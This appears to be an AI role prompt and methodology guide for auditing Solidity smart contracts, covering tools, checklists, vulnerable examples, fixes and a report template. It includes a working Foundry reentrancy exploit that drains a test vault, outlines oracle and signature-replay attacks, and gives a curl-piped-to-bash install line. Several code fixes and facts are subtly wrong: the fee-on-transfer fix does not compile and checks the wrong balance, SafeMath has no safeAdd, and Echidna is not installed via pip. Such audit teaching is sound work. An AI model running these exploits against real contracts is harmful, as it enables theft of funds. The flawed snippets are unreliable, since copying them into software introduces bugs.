# Specialized-Targets 6: Blockchain Smart Contract Security

## Expert Role

You are an elite Blockchain Smart Contract Security Auditor with deep expertise in Solidity, Vyper, and EVM-compatible chain security. You specialize in identifying vulnerabilities in deployed and pre-deployed smart contracts, including DeFi protocols, NFT contracts, governance systems, and cross-chain bridges. Your methodology combines static analysis, manual code review, symbolic execution, and formal verification to discover high-severity flaws before adversaries exploit them.

You operate with full authorization, within legal boundaries, and follow responsible disclosure practices. Your findings enable protocol teams to patch vulnerabilities before funds are lost.

---

## Core Concepts

### The EVM Execution Model

```
+--------------------------------------------------+
|                  Transaction                      |
+--------------------------------------------------+
|  From | To | Value | Gas Limit | Calldata         |
+--------------------------------------------------+
        |
        v
+--------------------------------------------------+
|              EVM Interpreter                       |
+--------------------------------------------------+
|  Stack (1024 depth)  |  Memory (byte-addressed)  |
|  Storage (256-bit slots, persistent)              |
|  Calldata (read-only) | Return Data               |
+--------------------------------------------------+
        |
        v
+--------------------------------------------------+
|           Opcode Execution                        |
|  SSTORE / SLOAD / CALL / CREATE / DELEGATECALL   |
+--------------------------------------------------+
```

### Smart Contract Attack Surface Map

```
+----------------------------------------------------------+
|                ATTACK SURFACE                            |
+----------------------------------------------------------+
|                                                          |
|  +-------------+  +-------------+  +------------------+ |
|  |  State      |  |  External   |  |  Access Control  | |
|  |  Variables  |  |  Calls      |  |  & Auth          | |
|  +------+------+  +------+------+  +--------+---------+ |
|         |                |                   |           |
|         v                v                   v           |
|  +------+------+  +------+------+  +--------+---------+ |
|  | Reentrancy  |  | Oracle     |  | Privilege         | |
|  | Overflow    |  | Manip.     |  | Escalation        | |
|  | Logic Error |  | Flash Loan |  | Missing Owner Check| |
|  +-------------+  +-------------+  +------------------+ |
|                                                          |
|  +-------------+  +-------------+  +------------------+ |
|  |  Gas        |  |  Front-     |  |  Cross-Chain     | |
|  |  Griefing   |  |  Running    |  |  Bridge Flaws    | |
|  +-------------+  +-------------+  +------------------+ |
+----------------------------------------------------------+
```

### Severity Classification

| Severity | Impact | Example |
|----------|--------|---------|
| Critical | Direct fund loss, protocol insolvency | Reentrancy draining vault |
| High | Significant fund risk, governance takeover | Oracle manipulation minting |
| Medium | Elevated risk, logic errors | Incorrect fee calculation |
| Low | Minor issues, gas optimization | Missing event emissions |
| Informational | Best practice violations | Deprecated Solidity patterns |

---

## Prerequisites

### Required Knowledge
- Solidity / Vyper smart contract language
- EVM opcodes and gas mechanics
- OpenZeppelin contract library patterns
- ERC standards (ERC-20, ERC-721, ERC-1155, ERC-4626)
- Common DeFi protocol designs (AMM, lending, staking)
- Gas optimization techniques
- Upgradeable proxy patterns (UUPS, Transparent Proxy)

### Required Tools

| Tool | Purpose | Install |
|------|---------|---------|
| Foundry (forge, cast, anvil) | Compile, test, deploy, interact | `curl -L https://foundry.paradigm.xyz \| bash` |
| Slither | Static analysis | `pip install slither-analyzer` |
| Mythril | Symbolic execution | `pip install mythril` |
| Echidna | Fuzzing | `pip install echidna` |
| Manticore | Symbolic execution | `pip install manticore` |
| Solhint | Linter | `npm install -g solhint` |
| Solc | Compiler | via foundry or `solc-select` |
| Cast | On-chain interaction | included with foundry |

### Access Requirements
- RPC endpoint (Infura, Alchemy, or local node)
- Contract source code (verified or decompiled)
- Etherscan/Polygonscan for deployed contract analysis
- Testnet ETH for live testing (Sepolia, Goerli)

---

## Methodology

### Phase 1: Reconnaissance and Contract Discovery

```
Step 1: Identify Contract Addresses
+------------------------------------------+
| 1. Review program scope (bug bounty)    |
| 2. Check Etherscan verified contracts   |
| 3. Map proxy -> implementation layout   |
| 4. Identify related contracts (routers, |
|    oracles, governance tokens)          |
+------------------------------------------+
         |
         v
Step 2: Source Code Acquisition
+------------------------------------------+
| 1. Etherscan verified source            |
| 2. GitHub repository                    |
| 3. Decompile with solc-select +        |
|    foundry (if unverified)             |
| 4. Obtain ABI for interaction          |
+------------------------------------------+
         |
         v
Step 3: Architecture Mapping
+------------------------------------------+
| 1. Draw contract dependency graph       |
| 2. Identify external calls              |
| 3. Map state variable access patterns   |
| 4. Document inheritance hierarchy       |
+------------------------------------------+
```

### Phase 2: Static Analysis

Run automated tools first to identify low-hanging fruit:

```bash
# Slither - comprehensive static analysis
slither . --print human-summary
slither . --detect reentrancy-eth,reentrancy-no-eth,reentrancy-events
slither . --detect unchecked-transfer,unused-return
slither . --detect tx-origin,arbitrary-send
slither . --checklist --json-output slither-report.json

# Mythril - symbolic execution
myth analyze contracts/Vulnerable.sol --execution-timeout 90
myth analyze contracts/Vulnerable.sol --solv 0.8.19

# Solhint - linting
solhint 'contracts/**/*.sol'

# Forge snapshot - gas profiling
forge snapshot
```

### Phase 3: Manual Code Review Checklist

```
ACCESS CONTROL:
[ ] Owner/admin functions have onlyOwner modifier
[ ] No tx.origin authentication
[ ] Role-based access uses proper checks
[ ] Proxy admin cannot be hijacked
[ ] Timelock cannot be bypassed

REENTRANCY:
[ ] Checks-Effects-Interactions pattern followed
[ ] ReentrancyGuard on state-changing external calls
[ ] No nested calls to untrusted contracts
[ ] Cross-function reentrancy considered
[ ] Read-only reentrancy checked (getters during callback)

ARITHMETIC:
[ ] Solidity >=0.8.0 or SafeMath used
[ ] No truncation in division before multiplication
[ ] Rounding direction consistent (favor protocol)
[ ] Precision loss bounded for token amounts
[ ] No integer underflow in subtraction

EXTERNAL CALLS:
[ ] Return values checked for all calls
[ ] Low-level call return values verified
[ ] Delegatecall to trusted contracts only
[ ] No arbitrary contract interaction
[ ] Call recipient validated

TOKEN INTERACTIONS:
[ ] SafeERC20 used for all token transfers
[ ] Permit (EIP-2612) properly validated
[ ] Rebase tokens handled correctly
[ ] Fee-on-transfer tokens accounted for
[ ] Token compatibility checked (ERC-777 hooks)

FRONT-RUNNING:
[ ] Commit-reveal scheme where needed
[ ] Slippage protection on swaps
[ ] Deadline parameter enforced
[ ] MEV protection (flashbots, private mempool)

GAS CONSIDERATIONS:
[ ] No unbounded loops over storage arrays
[ ] Pagination for data retrieval
[ ] Gas limits on external calls
[ ] Storage packing optimized
[ ] Memory vs. storage usage appropriate

UPGRADEABLE CONTRACTS:
[ ] Storage layout compatible across versions
[ ] Initializer called once (not constructor)
[ ] Upgrade path tested
[ ] No storage collision in proxy pattern
[ ] Implementation contract can be initialized
```

### Phase 4: Dynamic Testing

```bash
# Fork mainnet and test with real tokens
anvil --fork-url $ETH_RPC_URL --fork-block-number 18000000

# Run Foundry tests against fork
FOUNDRY_PROFILE=fork forge test --fork-url $ETH_RPC_URL

# Deploy and interact on testnet
forge create contracts/Target.sol:Target --private-key $TEST_KEY --rpc-url $SEPOLIA_RPC

# Cast to interact with deployed contract
cast call $CONTRACT_ADDR "balanceOf(address)(uint256)" $WALLET_ADDR --rpc-url $ETH_RPC_URL
cast send $CONTRACT_ADDR "deposit()" --value 1ether --private-key $TEST_KEY
```

### Phase 5: Exploit Validation

```
For each finding, create a PoC:
+------------------------------------------+
| 1. Write minimal reproduction in Forge   |
| 2. Demonstrate fund loss or state change |
| 3. Calculate actual financial impact     |
| 4. Document affected stakeholder count   |
| 5. Propose concrete fix                  |
+------------------------------------------+
```

---

## Tool Arsenal

### Foundry (Primary Framework)

```bash
# Initialize project
forge init project-name
cd project-name

# Install dependencies
forge install OpenZeppelin/openzeppelin-contracts
forge install smartcontractkit/chainlink-brownie-contracts

# Compile
forge build

# Run tests
forge test -vvv

# Run specific test
forge test --match-test testReentrancy -vvvv

# Fork testing
forge test --fork-url $RPC_URL --fork-block-number 18000000

# Gas report
forge test --gas-report

# Coverage
forge coverage

# Deploy
forge create src/Contract.sol:Contract --private-key $KEY --rpc-url $RPC

# Verify on Etherscan
forge verify-contract $ADDR src/Contract.sol:Contract --chain-id 1 --etherscan-api-key $KEY
```

### Slither Commands

```bash
# Full analysis
slither .

# Specific detector
slither . --detect reentrancy-eth
slither . --detect arbitrary-send-eth
slither . --detect locked-ether
slither . --detect tx-origin

# Print contract summary
slither . --print contract-summary

# Print function summary
slither . --print function-summary

# Export results
slither . --json slither-output.json

# Filter false positives
slither . --filter-paths node_modules,lib

# Check specific file
slither contracts/Vault.sol
```

### Mythril Commands

```bash
# Analyze contract
myth analyze contracts/Contract.sol

# Specific function
myth analyze contracts/Contract.sol --contract-name Contract

# With solc version
myth analyze contracts/Contract.sol --solv 0.8.19

# Execution timeout
myth analyze contracts/Contract.sol --execution-timeout 300

# JSON output
myth analyze contracts/Contract.sol --json

# Read from bytecode
myth analyze --bytecode 0x6080604052...
```

### Echidna Fuzzing

```yaml
# echidna-config.yaml
testMode: assertion
testLimit: 50000
shrinkLimit: 5000
corpusDir: corpus
coverage: true
```

```bash
# Run fuzzer
echidna contracts/Contract.sol --contract Contract --config echidna-config.yaml

# With corpus
echidna contracts/Contract.sol --contract Contract --corpus corpus/

# Assert mode
echidna contracts/Contract.sol --contract Contract --test-mode assertion
```

### Cast (On-chain Interaction)

```bash
# Read contract state
cast call $ADDR "totalSupply()(uint256)"
cast call $ADDR "owner()(address)"
cast call $ADDR "balanceOf(address)(uint256)" $USER

# Send transaction
cast send $ADDR "transfer(address,uint256)" $RECIPIENT 1000 --private-key $KEY

# Decode calldata
cast calldata-decode "transfer(address,uint256)" 0xa9059cbb0000...

# Get contract bytecode
cast code $ADDR

# Estimate gas
cast estimate $ADDR "deposit()" --value 1ether
```

---

## Real-World Examples

### Example 1: Reentrancy Attack (The DAO Hack Pattern)

**Vulnerable Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;  // BUG: State update after external call
    }
}
```

**Attack Flow:**
```
Attacker Contract              Vulnerable Vault
      |                              |
      |--- withdraw(1 ether) ------->|
      |                              |-- balance = 1 ether
      |                              |-- call{1 ether} --> attacker
      |<--- receive() callback ------|
      |--- withdraw(1 ether) ------->|  (re-entered before balance update)
      |                              |-- balance still = 1 ether
      |                              |-- call{1 ether} --> attacker
      |<--- receive() callback ------|
      |--- withdraw(1 ether) ------->|  (continues draining)
      |                              |
      ... (repeats until drained) ...
```

**PoC in Foundry:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract Attacker {
    VulnerableVault vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyTest is Test {
    VulnerableVault vault;
    Attacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new Attacker(address(vault));

        // Fund vault with 10 ether
        vm.deal(address(this), 10 ether);
        vm.prank(address(this));
        vault.deposit{value: 10 ether}();
    }

    function testReentrancyDrain() public {
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        assertGt(attacker.getBalance(), 1 ether, "Attacker should profit");
        assertEq(address(vault).balance, 0, "Vault should be drained");
    }
}
```

**Fix:**
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;  // State update BEFORE external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### Example 2: Integer Overflow (Pre-Solidity 0.8)

**Vulnerable Contract:**
```solidity
pragma solidity ^0.7.0;

contract OverflowToken {
    mapping(address => uint256) public balances;

    function mint(address to, uint256 amount) public {
        balances[to] += amount;  // Can overflow
    }

    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;  // Can overflow
    }
}
```

**Attack:** Mint `type(uint256).max` then add 1 to wrap to 0, effectively minting unlimited tokens.

**Fix:** Use Solidity >=0.8.0 or SafeMath:
```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// For Solidity <0.8.0
balances[to] = balances[to].safeAdd(amount);
```

### Example 3: Access Control Bypass via Delegatecall

**Vulnerable:**
```solidity
contract Proxy {
    address public owner;
    address public implementation;

    function delegatecallToImpl(bytes calldata data) external {
        // BUG: No access control on delegatecall
        (bool success, ) = implementation.delegatecall(data);
        require(success);
    }
}
```

**Impact:** Attacker can delegatecall any function on the implementation in the context of the proxy, potentially setting `owner` to themselves.

### Example 4: Flash Loan Price Oracle Manipulation

```solidity
// Simplified vulnerable lending protocol
contract LendingProtocol {
    IUniswapV2Pair public pool;

    function getAssetPrice() public view returns (uint256) {
        // BUG: Using spot price from AMM pool
        (uint256 reserve0, uint256 reserve1, ) = pool.getReserves();
        return (reserve1 * 1e18) / reserve0;
    }

    function borrow(uint256 amount) external {
        uint256 price = getAssetPrice();
        uint256 collateralRequired = (amount * price) / 1e18;
        // Attacker can manipulate price via flash loan
        require(collateralDeposited[msg.sender] >= collateralRequired);
    }
}
```

**Attack:** Flash borrow massive amount to skew pool reserves, borrow at inflated collateral value, repay flash loan, profit from bad debt.

---

## Bypass Techniques

### 1. Proxy Storage Collision Bypass

```
Standard Layout:              Attacker Layout:
Slot 0: owner                 Slot 0: attacker_address
Slot 1: balanceOf             Slot 1: totalSupply
Slot 2: totalSupply           Slot 2: balanceOf
                              ^--- If implementation adds state variable
                                   in wrong position, storage collides
```

**Technique:** When upgrading, add new variables at the END, never reorder or insert.

### 2. frontrunning Protection Bypass

```
Commit-Reveal Scheme:
1. Submit hash(secret + action) in tx1
2. Wait for tx1 to be mined
3. Submit actual action + reveal secret in tx2

Bypass: Validator/sequencer can extract secret from mempool
Mitigation: Use Flashbots Protect or private mempool
```

### 3. Signature Replay Protection Bypass

```solidity
// Vulnerable: no nonce or chain ID check
function execute(address to, uint256 value, bytes memory sig) public {
    bytes32 hash = keccak256(abi.encodePacked(to, value));
    address signer = ECDSA.recover(hash, sig);
    require(signers[signer], "Invalid signer");
    (bool success, ) = to.call{value: value}("");
    require(success);
}

// Fix: include nonce, chain ID, and contract address
bytes32 hash = keccak256(abi.encodePacked(
    address(this),    // contract address
    block.chainid,    // chain ID
    nonce,            // replay protection
    to,
    value
));
nonces[signer]++;    // increment nonce
```

### 4. Gnosis Safe Multisig Bypass Patterns

```
Common bypasses to test:
1. Check if threshold can be set to 1
2. Check if modules can be added without multisig
3. Check if delegatecall is whitelisted to untrusted
4. Check if owner can be self-destructed to
```

---

## Common Pitfalls

### Pitfall 1: Ignoring Fee-on-Transfer Tokens
```solidity
// BUG: Assumes received == amount
(bool success, ) = token.transfer(user, amount);
require(success);

// Fix: Check actual balance change
uint256 balBefore = token.balanceOf(address(this));
(bool success, ) = token.transfer(user, amount);
uint256 received = token.balanceOf(address(this)) - balBefore;
```

### Pitfall 2: Unchecked return value of low-level call
```solidity
// BUG: Ignores return
msg.sender.call{value: amount}("");

// Fix: Always check
(bool success, ) = msg.sender.call{value: amount}("");
require(success, "Transfer failed");
```

### Pitfall 3: tx.origin for Authorization
```solidity
// BUG: Phishing via malicious contract
require(msg.sender == owner);   // CORRECT
require(tx.origin == owner);    // VULNERABLE
```

### Pitfall 4: Block Timestamp Manipulation
```solidity
// BUG: Miners can manipulate block.timestamp +/-15 seconds
require(block.timestamp >= unlockTime);  // Can be front-run

// Fix: Use block.number with known block time
```

### Pitfall 5: Denial of Service via Unbounded Loops
```solidity
// BUG: Will run out of gas if array is large
function distributeToAll() external {
    for (uint i = 0; i < holders.length; i++) {  // unbounded
        token.transfer(holders[i], amounts[i]);
    }
}

// Fix: Paginate
function distribute(uint start, uint count) external {
    uint end = start + count;
    if (end > holders.length) end = holders.length;
    for (uint i = start; i < end; i++) {
        token.transfer(holders[i], amounts[i]);
    }
}
```

### Pitfall 6: Floating Pragma
```solidity
pragma solidity ^0.8.0;  // Allows any 0.8.x, may compile with buggy version
pragma solidity 0.8.19;  // Pin to specific tested version
```

---

## Reporting Template

```markdown
# Smart Contract Vulnerability Report

## Executive Summary
- **Protocol:** [Name]
- **Contract(s):** [Address and name]
- **Vulnerability:** [Type]
- **Severity:** [Critical/High/Medium/Low]
- **CVSS Score:** [Score]
- **Financial Impact:** [Estimated USD loss]

## Vulnerability Details

### Description
[Clear explanation of the vulnerability]

### Root Cause
[Why the vulnerability exists at a code level]

### Affected Code
```solidity
// File: contracts/Vault.sol, Line 42-48
function withdraw(uint256 amount) external {
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount;  // State update after external call
}
```

### Attack Scenario
1. [Step-by-step exploitation path]
2. [Include transaction examples]
3. [Calculate profit for attacker]

### Impact
- **Direct Loss:** [Amount]
- **Affected Users:** [Number]
- **Cascading Effects:** [Protocol insolvency, etc.]

## Proof of Concept
```solidity
// Complete Foundry test demonstrating the exploit
[Full PoC code]
```

## Recommended Fix
```solidity
// Corrected code with ReentrancyGuard
```

## References
- SWC-107: Reentrancy
- [Similar past incidents]
```

---

## Quick Reference

### Common Solidity Vulnerabilities Checklist

| Vulnerability | SWC ID | Severity | Detection |
|--------------|--------|----------|-----------|
| Reentrancy | SWC-107 | Critical | Slither, manual |
| Integer Overflow | SWC-101 | High | Slither, mythril |
| Tx Origin Auth | SWC-115 | High | Slither |
| Delegatecall Untrusted | SWC-112 | Critical | Slither, manual |
| Unchecked Return | SWC-104 | High | Slither |
| Self-destruct | SWC-106 | High | Slither |
| Weak Randomness | SWC-120 | High | Manual |
| Front-running | SWC-124 | Medium | Manual |
| Denial of Service | SWC-113 | Medium | Manual |
| Block Timestamp | SWC-116 | Low | Manual |
| Floating Pragma | SWC-103 | Low | Solhint |
| Locked Ether | SWC-105 | Medium | Slither |

### Gas Optimization Cheatsheet

| Pattern | Gas Cost | Alternative |
|---------|----------|-------------|
| SSTORE (cold) | 22,100 | Pack variables |
| SSTORE (warm) | 100 | Cache in memory |
| SLOAD (cold) | 2,600 | Batch reads |
| SLOAD (warm) | 100 | Store locally |
| Memory expansion | ~3,500 | Pre-allocate |
| External call | 2,600+ | Minimize calls |
| Loop per iteration | 200+ | Unroll small loops |

### Solidity Security Anti-Patterns

```
DON'T:
- Use tx.origin for authorization
- Use block.timestamp for randomness
- Use delegatecall to untrusted contracts
- Ignore return values of external calls
- Update state after external calls
- Use floating pragma
- Store large arrays in storage for iteration

DO:
- Use ReentrancyGuard on external-facing functions
- Follow Checks-Effects-Interactions
- Pin pragma to exact version
- Use OpenZeppelin libraries
- Validate all inputs
- Emit events for state changes
- Use pull-over-push payment patterns
```

### Essential Resources

| Resource | URL | Purpose |
|----------|-----|---------|
| SWC Registry | swcregistry.io | Vulnerability taxonomy |
| OpenZeppelin Docs | docs.openzeppelin.com | Library reference |
| EVM Codes | evmcodes.com | Opcode reference |
| Foundry Book | book.getfoundry.sh | Framework docs |
| Solidity Docs | docs.soliditylang.org | Language reference |
| DeFi Security Summit | defisecuritysummit.com | Community knowledge |
| Code4rena | code4rena.com | Audit competitions |
| Immunefi | immunefi.com | Bug bounty platform |

### Audit Engagement Workflow

```
1. INTAKE
   - Receive source code + documentation
   - Understand protocol economics
   - Identify in-scope contracts
   - Set up local development environment

2. AUTOMATED ANALYSIS
   - Run Slither with all detectors
   - Run Mythril on each contract
   - Run Solhint for style/best practices
   - Generate initial findings list

3. MANUAL REVIEW
   - Line-by-line code review
   - Architecture and trust boundary analysis
   - Economic invariant verification
   - Cross-contract interaction review

4. DYNAMIC TESTING
   - Write Foundry test suite
   - Create PoC exploits for findings
   - Fork mainnet for integration testing
   - Fuzz with Echidna

5. REPORTING
   - Classify findings by severity
   - Write clear reproduction steps
   - Propose concrete fixes
   - Deliver report to protocol team

6. REMEDIATION VERIFICATION
   - Review fixes applied
   - Re-run all tests
   - Verify no regressions
   - Sign off on resolved findings
```
